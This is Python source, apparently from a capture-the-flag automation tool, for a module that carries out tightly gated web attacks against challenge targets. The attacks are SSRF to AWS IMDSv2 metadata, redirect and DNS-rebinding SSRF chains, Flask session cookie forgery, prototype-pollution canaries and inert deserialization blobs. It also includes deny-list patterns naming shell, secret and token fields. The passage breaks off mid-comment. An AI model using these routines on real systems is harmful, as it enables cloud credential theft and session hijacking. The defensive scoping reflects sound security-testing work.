#!/usr/bin/env python3
"""Narrow cold readers for advanced, target-described Web contracts.

This peer deliberately has no discovery wordlist and no network transport of
its own.  It consumes the bounded responses that :mod:`proof_hunt` already
fetched, looks for one *structural* contract in one response, and sends only
through the scope-locked client in ``ctx``.  A prose hint is never enough.

The supported contracts are intentionally small:

``imdsv2_ssrf``
    An outer GET-query or POST JSON/form relay whose URL, inner-method and
    inner-header fields are all named by the target.  The standard IMDSv2 PUT
    and subsequent token-header GET are built with
    :func:`web.build_imdsv2_ssrf`; neither metadata endpoint is contacted by
    this process.

``open_redirect_ssrf``
    An exact same-origin redirect route is composed locally and passed as the
    exact URL value of an advertised SSRF relay.  The redirect destination
    must be a read-only internal URL.  The client itself follows no redirect.

``dns_rebind_ssrf``
    One advertised public rebinding URL is passed through one advertised SSRF
    relay.  It is never resolved or contacted directly and is never varied.

``flask_signed_session``
    A target-issued Flask cookie and target-published synthetic challenge key
    are verified together before one named scalar claim is changed.  A wrong
    key produces no request.

``prototype_pollution_canary``
    An isolated-instance contract may set one ``hzpp<hex>`` property and read
    it back.  The dangerous/gadget property deny-list remains enforced by the
    shipped helper.  A pre-write read is mandatory and a structural readback,
    not reflection, is required before a proof can be returned.

``deserialization_inert``
    The module serializes its own bounded primitive map/string and sends it to
    an exact parser field.  No target bytes are deserialized and no class,
    callable, gadget or command is present in the generated object.

``crlf_response_canary`` / ``host_header_canary``
    Two-request, GET-only differentials generated from fixed inert canaries.
    The target must publish the exact route, field/header and canary; the
    module never injects a cookie, credential, cache key or executable body.

``boolean_read_injection``
    One fixed false/true LDAP-filter or XPath predicate pair against an exact
    advertised read parameter.  It performs no extraction or authentication
    POST and treats the false response as a mandatory subtraction control.

``json_rpc_read`` / ``soap_read`` / ``grpc_web_read``
    One target-described, side-effect-free read operation after an exact GET
    control.  Method names are independently restricted to read verbs and all
    arguments are bounded inert scalars (gRPC accepts only an empty message).

``json_body_read``
    One target-published read-only JSON operation with its complete exact body.
    A preceding OPTIONS control must advertise only OPTIONS and POST.  Nested
    resource selectors and pagination are copied, never inferred, and the
    response must carry the exact declared read effect.

``readable_upload_canary`` / ``synthetic_credential_read`` /
``synthetic_bearer_read``
    Narrow stateful contracts for an isolated benign marker upload and a
    challenge-declared synthetic account.  The bearer variant additionally
    requires a post-login no-Authorization denial before replaying the exact
    nested target-issued token.  Each has a mandatory control and the proof is
    eligible only from its final read, never from the POST.

Every non-SOAP response is classified by ``forge_event.extract_success``; SOAP uses
the equivalent stricter entity-free XML label/status check.  Thus a returned
answer is one novel exact payoff token (ctf.flagfmt.PAYOFF_TEXT) in an explicitly successful
body, absent from every supplied/preloaded control.  Ambiguous JSON/XML,
competing contracts, incomplete baselines, unsafe routes, missing fields, or a
stopped deadline all fail closed.

Peer interface::

    solve(target, ctx) -> proof | None
"""

from __future__ import annotations

import base64
import html
import ipaddress
import json
import pickle
import pickletools
import re
import struct
import sys
import time
import urllib.parse
import xml.etree.ElementTree as ET
from pathlib import Path


# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import flagfmt, event as ctf_event
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import flagfmt, event as ctf_event

HERE = Path(__file__).resolve().parent
TOOLKITS = HERE.parent / "toolkits"
for _folder in (TOOLKITS, HERE):
    if str(_folder) not in sys.path:
        sys.path.insert(0, str(_folder))

import web as _web  # noqa: E402 -- scope/route policy and offline builders
import security_json as _security_json  # noqa: E402 -- duplicate-key rejecting JSON

try:  # A partial export must decline; it must not use a weaker extractor.
    import forge_event as _proofs  # noqa: E402
except Exception:  # pragma: no cover - production exports contain it
    _proofs = None

try:
    import exploit_classes as _classes  # noqa: E402 -- benign canary/blob helpers
except Exception:  # pragma: no cover - production exports contain it
    _classes = None


MAX_TEXT = 400_000
MAX_PRELOADED = 96
MAX_BASELINES = 160
MAX_CONTRACT_NODES = 512
MAX_CONTRACT_DEPTH = 7
MAX_ROUTE_BYTES = 1024
MAX_OUTER_BYTES = 16 * 1024
MAX_REQUESTS = 10
DEADLINE_PAD = 0.30

# The event's exact payoff token (ctf.flagfmt): a proof under a proof event, else a flag.
PAYOFF_WIRE = flagfmt.PAYOFF_TEXT
PAYOFF_SCAN = flagfmt.PAYOFF_TEXT
_URLISH = re.compile(r"(?i)(?:https?|file|gopher)://")


def _slug() -> str:
    """The active event's slug: the label of every target-visible canary (no event name in code)."""
    return ctf_event.current().slug


def _platform_hosts() -> set:
    """The event's own platform hosts, never an SSRF destination: the profile's platform.base_url host
    plus its platform.hosts (a proxy's name, say). A manual platform has none of its own. Any other kind
    with no host is a broken profile and fails loudly rather than leaving the platform undenied."""
    prof = ctf_event.current()
    hosts = set(prof.platform.all_hosts())
    if not hosts and prof.platform.kind != "manual":
        raise RuntimeError(f"event {prof.slug!r}: platform kind {prof.platform.kind!r} names no platform "
                           "host (platform.base_url / platform.hosts); the SSRF platform denylist "
                           "would be empty")
    return hosts
FIELD = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
CANARY_PP = re.compile(r"^hzpp[0-9a-f]{8,24}$")
CANARY_DS = re.compile(r"^hzds[0-9a-f]{8,24}$")
CANARY_CRLF = re.compile(r"^hzcrlf[0-9a-f]{8,24}$")
CANARY_UPLOAD = re.compile(r"^hzup[0-9a-f]{8,24}$")
HOST_CANARY = re.compile(r"^hzhost[0-9a-f]{8,24}\.invalid$")
SAFE_VALUE = re.compile(r"^[A-Za-z0-9_.:-]{1,96}$")
JSON_PATH_KEY = re.compile(r"^[A-Za-z_][A-Za-z0-9_-]{0,63}$")
BEARER_TOKEN = re.compile(r"^[A-Za-z0-9._~+/=-]{16,4096}$")
DNS_LABEL = re.compile(r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?", re.I)
READ_OPERATION = re.compile(
    r"(?i)^(?:get|list|read|fetch|find|lookup|search|query|inspect|describe|status|health|version)"
    r"[A-Za-z0-9_.:/-]{0,96}$")
SENSITIVE_READ_ROUTE = re.compile(
    r"(?i)(?:^|[/_.-])(?:login|logon|signin|signon|auth|oauth|session|password|passwd|"
    r"reset|recover|token|checkout|payment|transfer)(?:$|[/_.-])")
JSON_BODY_FATAL = re.compile(
    r"(?i)(?:^|_)(?:delete|remove|destroy|drop|truncate|write|update|create|insert|upload|execute|"
    r"command|cmd|shell|password|passwd|secret|token|authorization|cookie|admin|role|privilege|"
    r"callback|webhook|url|uri|redirect|transfer|payment|checkout|reset|recover|revoke)(?:$|_)")

_MISSING = object()
_AMBIGUOUS = object()

_KIND_ALIASES = {
    "imdsv2_ssrf": "imdsv2_ssrf",
    "ssrf_imdsv2": "imdsv2_ssrf",
    "imdsv2_header_relay": "imdsv2_ssrf",
    "cloud_metadata_imdsv2": "imdsv2_ssrf",
    "open_redirect_ssrf": "open_redirect_ssrf",
    "ssrf_open_redirect": "open_redirect_ssrf",
    "redirect_ssrf_chain": "open_redirect_ssrf",
    "dns_rebind_ssrf": "dns_rebind_ssrf",
    "ssrf_dns_rebind": "dns_rebind_ssrf",
    "dns_rebinding": "dns_rebind_ssrf",
    "flask_signed_session": "flask_signed_session",
    "flask_session_forge": "flask_signed_session",
    "signed_session": "flask_signed_session",
    "prototype_pollution_canary": "prototype_pollution_canary",
    "prototype_pollution": "prototype_pollution_canary",
    "deserialization_inert": "deserialization_inert",
    "inert_deserialization": "deserialization_inert",
    "deserialization_canary": "deserialization_inert",
    "crlf_response_canary": "crlf_response_canary",
    "crlf_response_split": "crlf_response_canary",
    "host_header_canary": "host_header_canary",
    "host_header": "host_header_canary",
    "boolean_read_injection": "boolean_read_injection",
    "ldap_xpath_injection": "boolean_read_injection",
    "json_rpc_read": "json_rpc_read",
    "read_only_json_rpc": "json_rpc_read",
    "soap_read": "soap_read",
    "read_only_soap": "soap_read",
    "grpc_web_read": "grpc_web_read",
    "read_only_grpc_web": "grpc_web_read",
    "readable_upload_canary": "readable_upload_canary",
    "inert_upload_canary": "readable_upload_canary",
    "synthetic_credential_read": "synthetic_credential_read",
    "challenge_account_read": "synthetic_credential_read",
    "synthetic_bearer_read": "synthetic_bearer_read",
    "challenge_bearer_read": "synthetic_bearer_read",
    "json_body_read": "json_body_read",
    "openapi_json_read": "json_body_read",
}

SUPPORTED_CONTRACTS = tuple(dict.fromkeys(_KIND_ALIASES.values()))


def _canonical(value):
    text = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(value or ""))
    return re.sub(r"[^a-z0-9]+", "_", text.lower()).strip("_")


def _left(ctx):
    deadline = ctx.get("deadline") if isinstance(ctx, dict) else None
    if deadline is None:
        return None
    try:
        return float(deadline) - time.time()
    except (TypeError, ValueError, OverflowError):
        return -1.0


def _can_send(ctx, state, reserve=1):
    stop = ctx.get("stop") if isinstance(ctx, dict) else None
    if stop is not None:
        try:
            if stop.is_set():
                return False
        except Exception:
            return False
    left = _left(ctx)
    if left is not None and left <= DEADLINE_PAD:
        return False
    try:
        count = int(state.get("requests", 0))
    except (TypeError, ValueError, OverflowError):
        return False
    raw_limit = ctx.get("max_requests", MAX_REQUESTS) if isinstance(ctx, dict) else MAX_REQUESTS
    try:
        if isinstance(raw_limit, bool):
            return False
        limit = int(raw_limit)
        # Do not silently round a caller's malformed fractional budget.
        if isinstance(raw_limit, float) and raw_limit != limit:
            return False
    except (TypeError, ValueError, OverflowError):
        return False
    limit = min(MAX_REQUESTS, limit)
    return (0 <= count and 0 <= limit and 0 < reserve <= MAX_REQUESTS
            and count + reserve <= limit)


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if raw.get("framing_error") or raw.get("truncated") is True:
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode("utf-8", "replace")
        return out
    return None


def _views(response):
    if _proofs is None or response is None:
        return []
    try:
        return [str(item)[:MAX_TEXT]
                for item in _proofs.response_text_views(response, strict=True)]
    except Exception:
        return []


def _json_doc(response):
    views = _views(response)
    if not views:
        return None
    try:
        return _security_json.loads_unique(views, max_chars=MAX_TEXT,
                                           max_nodes=MAX_CONTRACT_NODES * 16,
                                           max_depth=48)
    except Exception:
        return None


def _baseline(response):
    if _proofs is None or response is None:
        return None
    try:
        return str(_proofs.response_baseline_text(response))[:MAX_TEXT]
    except Exception:
        return getattr(_proofs, "BASELINE_STRICT_INCOMPLETE",
                       "<!-- csctf-baseline-strict-set:incomplete -->")


def _origin_host(url):
    try:
        return (urllib.parse.urlsplit(str(url or "")).hostname or "").lower().rstrip(".")
    except Exception:
        return ""


def _proof(response, baselines, host, state=None):
    if _proofs is None or response is None:
        return None
    try:
        status = int(response.get("status"))
    except (TypeError, ValueError, OverflowError):
        return None
    if status < 200 or status >= 300:
        return None
    try:
        info = _proofs.extract_success(response, baseline_texts=baselines, host=host)
    except Exception:
        return None
    if not isinstance(info, dict):
        return None
    if isinstance(state, dict):
        if info.get("baseline_incomplete"):
            state["baseline_incomplete"] = True
            state["terminal"] = True
        found = state.setdefault("candidates", [])
        for item in list(info.get("candidates") or [])[:12]:
            value = str(item)[:256]
            if value not in found and len(found) < 12:
                found.append(value)
        if found:
            state["terminal"] = True
    value = info.get("auto")
    if info.get("baseline_incomplete"):
        return None
    return value if isinstance(value, str) and PAYOFF_WIRE.fullmatch(value) else None


def _cache(ctx, base_url):
    raw = ctx.get("preloaded") if isinstance(ctx, dict) else None
    if not isinstance(raw, dict) or len(raw) > MAX_PRELOADED:
        return {}
    out, original, collided = {}, {}, set()
    for raw_route, raw_response in raw.items():
        if not isinstance(raw_route, str):
            continue
        try:
            route = _web.safe_preloaded_route_key(
                raw_route, base_url, max_bytes=MAX_ROUTE_BYTES)
        except Exception:
            route = None
        if route is None or route in collided:
            continue
        if route in original and original[route] != raw_route:
            out.pop(route, None)
            collided.add(route)
            continue
        response = _response(raw_response)
        if response is not None:
            out[route] = response
            original[route] = raw_route
    return out


def _baseline_set(ctx, cache):
    values = []
    supplied = ctx.get("baseline_texts") if isinstance(ctx, dict) else None
    if isinstance(supplied, (list, tuple)):
        for item in supplied[:MAX_BASELINES]:
            value = str(item or "")[:MAX_TEXT]
            if value and value not in values:
                values.append(value)
    overflow = isinstance(supplied, (list, tuple)) and len(supplied) > MAX_BASELINES
    for response in list(cache.values())[:MAX_PRELOADED]:
        value = _baseline(response)
        if value and value not in values:
            if len(values) >= MAX_BASELINES:
                overflow = True
                break
            values.append(value)
    if overflow and _proofs is not None:
        marker = getattr(_proofs, "BASELINE_STRICT_INCOMPLETE",
                         "<!-- csctf-baseline-strict-set:incomplete -->")
        if marker not in values:
            values.append(marker)
    return values


def _walk(value, *, depth=0, counter=None):
    counter = counter if counter is not None else [0]
    if depth > MAX_CONTRACT_DEPTH or counter[0] >= MAX_CONTRACT_NODES:
        return
    counter[0] += 1
    if isinstance(value, dict):
        yield value
        for child in value.values():
            yield from _walk(child, depth=depth + 1, counter=counter)
    elif isinstance(value, list):
        for child in value[:128]:
            yield from _walk(child, depth=depth + 1, counter=counter)


def _alias(obj, names, types=None, default=_MISSING):
    if not isinstance(obj, dict):
        return _AMBIGUOUS
    wanted = {_canonical(name) for name in names}
    found = [(key, value) for key, value in obj.items() if _canonical(key) in wanted]
    if len(found) > 1:
        return _AMBIGUOUS
    if not found:
        return default
    value = found[0][1]
    if types is not None and (not isinstance(value, types)
                              or isinstance(value, bool) and bool not in (types if isinstance(types, tuple) else (types,))):
        return _AMBIGUOUS
    return value


def _contract_kind(obj):
    marker = _alias(obj, (
        "contract", "contract_type", "exploit_contract", "exploit_class",
        "vulnerability_class", "kind",
    ), str)
    if marker in (_MISSING, _AMBIGUOUS):
        return None
    return _KIND_ALIASES.get(_canonical(marker))


def _contracts(cache):
    grouped = {name: {} for name in SUPPORTED_CONTRACTS}
    for route, response in cache.items():
        doc = _json_doc(response)
        if not isinstance(doc, (dict, list)):
            continue
        for obj in _walk(doc):
            kind = _contract_kind(obj)
            if kind is None:
                continue
            try:
                canonical = json.dumps(obj, sort_keys=True, separators=(",", ":"),
                                       ensure_ascii=False, allow_nan=False)
            except (TypeError, ValueError, UnicodeError):
                continue
            if len(canonical.encode("utf-8")) > 32 * 1024:
                continue
            grouped[kind][canonical] = (obj, route)
    out = {}
    ambiguous = set()
    for kind, rows in grouped.items():
        if len(rows) == 1:
            out[kind] = next(iter(rows.values()))
        elif len(rows) > 1:
            ambiguous.add(kind)
    return out, ambiguous


def _safe_route(value, base_url):
    try:
        route = _web.safe_same_origin_route(
            value, base_url, allow_query=False, max_bytes=MAX_ROUTE_BYTES)
    except Exception:
        return None
    if route is None:
        return None
    try:
        layers = _web.canonical_route_layers(route, max_bytes=MAX_ROUTE_BYTES)
        if not layers or any(_web.route_has_destructive_action(layer) for layer in layers):
            return None
    except Exception:
        return None
    return route


def _allowed(ctx, route):
    gate = ctx.get("route_allowed") if isinstance(ctx, dict) else None
    if not callable(gate) or not isinstance(route, str):
        return False
    try:
        return bool(gate(route))
    except Exception:
        return False


def _field(value):
    return value if isinstance(value, str) and FIELD.fullmatch(value) else None


def _outer_spec(contract, base_url, *, relay=False):
    raw_route = _alias(contract, ("route", "endpoint", "feature_route", "fetch_route", "ssrf_route"), str)
    method = _alias(contract, ("outer_method", "request_method"), str)
    transport = _alias(contract, ("transport", "outer_transport", "request_transport"), str)
    url_field = _alias(contract, ("url_field", "url_parameter", "target_parameter", "ssrf_parameter"), str)
    if any(item in (_MISSING, _AMBIGUOUS) for item in (raw_route, method, transport, url_field)):
        return None
    route = _safe_route(raw_route, base_url)
    method = str(method).upper()
    transport = _canonical(transport)
    if (route is None or _field(url_field) is None
            or (transport == "query" and method != "GET")
            or (transport in ("json", "form") and method != "POST")
            or transport not in ("query", "json", "form")):
        return None
    out = {"route": route, "method": method, "transport": transport,
           "url_field": url_field}
    if not relay:
        return out

    method_field = _alias(contract, ("method_field", "method_parameter", "forward_method_field"), str)
    headers_field = _alias(contract, ("headers_field", "headers_parameter", "forward_headers_field"), str,
                           default=None)
    header_name = _alias(contract, ("header_name_field", "header_name_parameter"), str, default=None)
    header_value = _alias(contract, ("header_value_field", "header_value_parameter"), str, default=None)
    if method_field in (_MISSING, _AMBIGUOUS) or _field(method_field) is None:
        return None
    if headers_field is _AMBIGUOUS or header_name is _AMBIGUOUS or header_value is _AMBIGUOUS:
        return None
    map_mode = headers_field is not None and _field(headers_field) is not None
    split_mode = (header_name is not None and header_value is not None
                  and _field(header_name) is not None and _field(header_value) is not None)
    if map_mode == split_mode:
        return None
    out.update(method_field=method_field, header_mode="map" if map_mode else "split")
    if map_mode:
        out["headers_field"] = headers_field
    else:
        out.update(header_name_field=header_name, header_value_field=header_value)
    return out


def _compose(spec, target_url, *, inner_method=None, inner_headers=None):
    values = {spec["url_field"]: target_url}
    if inner_method is not None:
        values[spec["method_field"]] = inner_method
    if inner_headers is not None:
        if len(inner_headers) != 1:
            return None
        if spec.get("header_mode") == "map":
            values[spec["headers_field"]] = dict(inner_headers)
        elif spec.get("header_mode") == "split":
            name, value = next(iter(inner_headers.items()))
            values[spec["header_name_field"]] = name
            values[spec["header_value_field"]] = value
        else:
            return None
    try:
        if spec["transport"] == "query":
            encoded = {}
            for key, value in values.items():
                encoded[key] = (json.dumps(value, separators=(",", ":"), sort_keys=True)
                                if isinstance(value, dict) else str(value))
            route = spec["route"] + "?" + urllib.parse.urlencode(encoded)
            return route, None, {}
        if spec["transport"] == "json":
            data = json.dumps(values, separators=(",", ":"), ensure_ascii=True, allow_nan=False)
            return spec["route"], data, {"Content-Type": "application/json"}
        data = urllib.parse.urlencode({
            key: (json.dumps(value, separators=(",", ":"), sort_keys=True)
                  if isinstance(value, dict) else str(value))
            for key, value in values.items()
        })
        return spec["route"], data, {"Content-Type": "application/x-www-form-urlencoded"}
    except (TypeError, ValueError, UnicodeError):
        return None


def _send_outer(ctx, state, spec, target_url, *, inner_method=None, inner_headers=None):
    made = _compose(spec, target_url, inner_method=inner_method, inner_headers=inner_headers)
    if made is None:
        return None
    route, body, headers = made
    try:
        wire_size = len(route.encode("utf-8")) + len((body or "").encode("utf-8"))
    except UnicodeError:
        return None
    if wire_size > MAX_OUTER_BYTES or not _allowed(ctx, route) or not _can_send(ctx, state):
        return None
    client = ctx.get("client")
    if client is None:
        return None
    state["requests"] += 1
    if str(inner_method or "").upper() not in ("", "GET"):
        state["terminal"] = True
    if spec["method"] == "POST":
        state["posts"] += 1
        state["terminal"] = True
    return _response(client.request(spec["method"], route, data=body, headers=headers,
                                    allow_redirects=False))


def _extract_token(response, contract):
    if response is None:
        return None
    try:
        status = int(response.get("status"))
    except (TypeError, ValueError, OverflowError):
        return None
    if not 200 <= status < 300:
        return None
    source = _alias(contract, ("token_source", "token_response"), str)
    if source in (_MISSING, _AMBIGUOUS):
        return None
    source = _canonical(source)
    if source == "body":
        views = _views(response)
        if len(views) != 1:
            return None
        value = views[0].strip()
    elif source in ("json", "json_field"):
        token_field = _alias(contract, ("token_field", "token_response_field"), str)
        if token_field in (_MISSING, _AMBIGUOUS) or _field(token_field) is None:
            return None
        doc = _json_doc(response)
        if not isinstance(doc, dict) or list(doc).count(token_field) != 1:
            return None
        value = doc.get(token_field)
    else:
        return None
    if (not isinstance(value, str) or value != value.strip()
            or not 8 <= len(value) <= 4096
            or any(ord(char) < 0x21 or ord(char) > 0x7e for char in value)):
        return None
    return value


def _imdsv2(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    spec = _outer_spec(contract, base_url, relay=True)
    metadata_path = _alias(contract, ("metadata_path", "metadata_read_path"), str)
    if spec is None or metadata_path in (_MISSING, _AMBIGUOUS):
        return None
    if (not metadata_path.startswith("/latest/meta-data/")
            or len(metadata_path.encode("utf-8", "replace")) > 1024):
        return None
    try:
        plan = _web.build_imdsv2_ssrf(spec["url_field"], metadata_path)
    except Exception:
        return None
    if not isinstance(plan, list) or len(plan) != 2:
        return None
    token_url = _alias(contract, ("token_url", "metadata_token_url"), str,
                       default=plan[0].get("target_url"))
    ttl = _alias(contract, ("token_ttl_seconds", "metadata_token_ttl"), int,
                 default=21600)
    expected_meta = plan[1].get("target_url")
    if (token_url != plan[0].get("target_url") or ttl != 21600
            or not isinstance(expected_meta, str)):
        return None
    try:
        if (_web.safe_internal_url(token_url) != token_url
                or _web.safe_internal_url(expected_meta) != expected_meta):
            return None
    except Exception:
        return None
    if not _allowed(ctx, spec["route"]) or not _can_send(ctx, state, reserve=2):
        return None

    first = _send_outer(ctx, state, spec, token_url,
                        inner_method=plan[0]["method"], inner_headers=plan[0]["headers"])
    token = _extract_token(first, contract)
    control = _baseline(first)
    if control:
        baselines.append(control)
    if token is None:
        return None
    headers = dict(plan[1]["headers"])
    headers["X-aws-ec2-metadata-token"] = token
    second = _send_outer(ctx, state, spec, expected_meta,
                         inner_method=plan[1]["method"], inner_headers=headers)
    return _proof(second, baselines, _origin_host(base_url), state)


def _redirect_chain(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    spec = _outer_spec(contract, base_url, relay=False)
    raw_redirect = _alias(contract, ("redirect_route", "redirect_endpoint"), str)
    redirect_field = _alias(contract, ("redirect_field", "redirect_parameter"), str)
    destination = _alias(contract, ("redirect_destination", "destination_url", "internal_url"), str)
    redirect_method = _alias(contract, ("redirect_method",), str, default="GET")
    if (spec is None or any(value in (_MISSING, _AMBIGUOUS)
                           for value in (raw_redirect, redirect_field, destination))
            or str(redirect_method).upper() != "GET" or _field(redirect_field) is None):
        return None
    redirect_route = _safe_route(raw_redirect, base_url)
    try:
        inner = _web.safe_internal_url(destination)
    except Exception:
        inner = None
    if redirect_route is None or inner is None or not _allowed(ctx, redirect_route):
        return None
    redirect_path = redirect_route + "?" + urllib.parse.urlencode({redirect_field: inner})
    try:
        parts = urllib.parse.urlsplit(base_url)
        redirect_url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, redirect_path, "", ""))
    except Exception:
        return None
    response = _send_outer(ctx, state, spec, redirect_url)
    return _proof(response, baselines, _origin_host(base_url), state)


def _safe_rebind_url(value, target_url):
    if (not isinstance(value, str) or value != value.strip() or not value
            or len(value.encode("utf-8", "replace")) > 4096):
        return None
    try:
        parts = urllib.parse.urlsplit(value)
        if (parts.scheme.lower() not in ("http", "https") or not parts.hostname
                or parts.username is not None or parts.password is not None or parts.fragment
                or "@" in parts.netloc or "\\" in value):
            return None
        host = parts.hostname.lower().rstrip(".")
        try:
            ipaddress.ip_address(host)
            return None
        except ValueError:
            pass
        if _web.internal_host(host) or host == _origin_host(target_url):
            return None
        labels = host.split(".")
        if len(labels) < 2 or any(not DNS_LABEL.fullmatch(label) for label in labels):
            return None
        if host in _platform_hosts():
            return None
        path = parts.path or "/"
        if (not _web.safe_route_path(path, max_bytes=2048)
                or _web.route_has_destructive_action(path)
                or (parts.query and not _web.safe_route_query_component(parts.query, max_bytes=2048))
                or (parts.query and _web.route_has_destructive_action(parts.query))):
            return None
        # Recompose to reject noncanonical authorities, empty/bogus ports and
        # Unicode lookalikes.  A normal explicit port is retained.
        port = parts.port
        authority = host + (f":{port}" if port is not None else "")
        if parts.netloc.lower().rstrip(".") != authority:
            return None
        return urllib.parse.urlunsplit((parts.scheme.lower(), authority, path, parts.query, ""))
    except (TypeError, ValueError, UnicodeError):
        return None


def _dns_rebind(target, ctx, state, contract, baselines):
    base_url = str(target.get("url") or "")
    spec = _outer_spec(contract, base_url, relay=False)
    raw_url = _alias(contract, ("rebind_url", "rebinding_url"), str)
    count = _alias(contract, ("request_count", "rebind_requests"), int)
    if (spec is None or raw_url in (_MISSING, _AMBIGUOUS)
            or count in (_MISSING, _AMBIGUOUS) or isinstance(count, bool)
            or count not in (1, 2, 3)):
        return None
    rebind_url = _safe_rebind_url(raw_url, base_url)
    if rebind_url is None or not _allowed(ctx, spec["route"]) or not _can_send(ctx, state, reserve=count):
        return None
    host = _origin_host(base_url)
    for index in range(count):
        response = _send_outer(ctx, state, spec, rebind_url)
        value = _proof(response, baselines, host, state)
        if value:
            return value
        if state.get("candidates") or state.get("baseline_incomplete"):
            return None
        if index + 1 < count:
            control = _baseline(response)
            if control:
                baselines.append(control)
    return None


def _flask_session(target, ctx, state, contract, baselines):
    if _proofs is None:
        return None
    base_url = str(target.get("url") or "")
    raw_route = _alias(contract, ("route", "protected_route", "read_route"), str)
    method = _alias(contract, ("method", "request_method"), str)
    cookie_name = _alias(contract, ("cookie_name", "session_cookie_name"), str)
    cookie = _alias(contract, ("session_cookie", "cookie_value"), str)
    secret = _alias(contract, ("secret_key", "session_secret_key"), str)
    claim = _alias(contract, ("claim", "claim_name", "session_claim"), str)
    desired = _alias(contract, ("value", "claim_value", "session_value"),
                     (str, int, bool))
    fields = (raw_route, method, cookie_name, cookie, secret, claim, desired)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    route = _safe_route(raw_route, base_url)
    if (route is None or str(method).upper() != "GET" or _field(cookie_name) is None
            or _field(claim) is None or claim.startswith("__")
            or not isinstance(cookie, str) or not 16 <= len(cookie) <= 8192
            or not isinstance(secret, str) or not 1 <= len(secret) <= 512
            or any(ord(char) < 0x20 for char in secret)
            or isinstance(desired, str) and not SAFE_VALUE.fullmatch(desired)):
        return None
    try:
        claims = _web.parse_flask_session(cookie)
        if not isinstance(claims, dict):
            return None
        forged = _web.forge_flask_session(cookie, secret, merge={claim: desired})
    except Exception:
        return None
    if (not isinstance(forged, str) or not forged or forged == cookie
            or any(char in forged for char in ("\r", "\n", ";"))
            or not _allowed(ctx, route) or not _can_send(ctx, state)):
        return None
    client = ctx.get("client")
    if client is None:
        return None
    # Confirm-first makes this a proven synthetic key, but it is still a
    # credential-backed target read and therefore a one-shot protocol.
    state["terminal"] = True
    state["requests"] += 1
    response = _response(client.request(
        "GET", route, headers={"Cookie": f"{cookie_name}={forged}"},
        allow_redirects=False,
    ))
    return _proof(response, baselines, _origin_host(base_url), state)


def _prototype_canary(target, ctx, state, contract, baselines):
    if _classes is None:
        return None
    base_url = str(target.get("url") or "")
    raw_write = _alias(contract, ("write_route", "merge_route"), str)
    raw_read = _alias(contract, ("readback_route", "read_route"), str)
    write_method = _alias(contract, ("write_method",), str)
    read_method = _alias(contract, ("read_method",), str)
    transport = _alias(contract, ("transport", "write_transport"), str)
    variant = _alias(contract, ("payload_variant", "canary_variant"), str)
    canary = _alias(contract, ("canary", "canary_name"), str)
    value = _alias(contract, ("value", "canary_value"), str)
    isolated = _alias(contract, ("isolated_instance", "isolated"), bool)
    effect = _alias(contract, ("effect", "proof_effect"), str)
    fields = (raw_write, raw_read, write_method, read_method, transport,
              variant, canary, value, isolated, effect)
    if any(item in (_MISSING, _AMBIGUOUS) for item in fields):
        return None
    write_route = _safe_route(raw_write, base_url)
    read_route = _safe_route(raw_read, base_url)
    variant = _canonical(variant)
    if (write_route is None or read_route is None or str(write_method).upper() != "POST"
            or str(read_method).upper() != "GET" or _canonical(transport) != "json"
            or variant not in ("proto_json", "ctor_json") or isolated is not True
            or _canonical(effect) != "canary_readback" or not CANARY_PP.fullmatch(canary)
            or not SAFE_VALUE.fullmatch(value)
            or not _allowed(ctx, write_route) or not _allowed(ctx, read_route)
            or not _can_send(ctx, state, reserve=3)):
        return None
    try:
        rows = _classes.proto_pollution_payloads(canary, value=value)
        payload = next(row for row in rows if row.get("name") == variant)
    except Exception:
        return None
    if payload.get("method") != "POST" or not isinstance(payload.get("json"), dict):
        return None
    client = ctx.get("client")
    if client is None:
        return None

    # Mandatory negative control proves that the advertised property was not
    # already present before the one state-changing request.  A transport
    # error, non-2xx page, malformed/ambiguous JSON or HTML error body proves
    # no absence at all and therefore cannot authorize the POST.
    state["requests"] += 1
    before = _response(client.request("GET", read_route, allow_redirects=False))
    try:
        before_status = int(before.get("status")) if isinstance(before, dict) else 0
        before_doc = _json_doc(before)
        if (not 200 <= before_status < 300
                or not isinstance(before_doc, (dict, list))
                or _classes.classify_proto_pollution(before, payload=payload).get("confirmed")):
            return None
    except Exception:
        return None
    prior = _baseline(before)
    if prior:
        baselines.append(prior)
    if not _can_send(ctx, state, reserve=2) or not _allowed(ctx, write_route):
        return None
    body = json.dumps(payload["json"], separators=(",", ":"), ensure_ascii=True)
    state["terminal"] = True
    state["requests"] += 1
    state["posts"] += 1
    written = _response(client.request(
        "POST", write_route, data=body, headers={"Content-Type": "application/json"},
        allow_redirects=False,
    ))
    write_control = _baseline(written)
    if write_control:
        baselines.append(write_control)
    if not _can_send(ctx, state) or not _allowed(ctx, read_route):
        return None
    state["requests"] += 1
    after = _response(client.request("GET", read_route, allow_redirects=False))
    try:
        confirmed = _classes.classify_proto_pollution(after, payload=payload).get("confirmed")
    except Exception:
        confirmed = False
    if not confirmed:
        return None
    return _proof(after, baselines, _origin_host(base_url), state)


_PICKLE_FORBIDDEN = {
    "GLOBAL", "STACK_GLOBAL", "REDUCE", "BUILD", "OBJ", "INST", "NEWOBJ",
    "NEWOBJ_EX", "EXT1", "EXT2", "EXT4", "PERSID", "BINPERSID",
}


def _inert_blob(fmt, canary):
    if fmt == "python_pickle":
        raw = pickle.dumps({f"{_slug()}_canary": canary}, protocol=4)
        try:
            if any(op.name in _PICKLE_FORBIDDEN for op, _arg, _pos in pickletools.genops(raw)):
                return None
        except Exception:
            return None
        return raw, "python_pickle", "primitive_map"
    if fmt == "php":
        key = f"{_slug()}_canary"
        body = (f'a:1:{{s:{len(key.encode("utf-8"))}:"{key}";'
                f's:{len(canary.encode("utf-8"))}:"{canary}";}}')
        return body.encode("ascii"), "php", "primitive_map"
    if fmt == "java":
        data = canary.encode("ascii")
        # STREAM_MAGIC, STREAM_VERSION, TC_STRING, modified-UTF length.  The
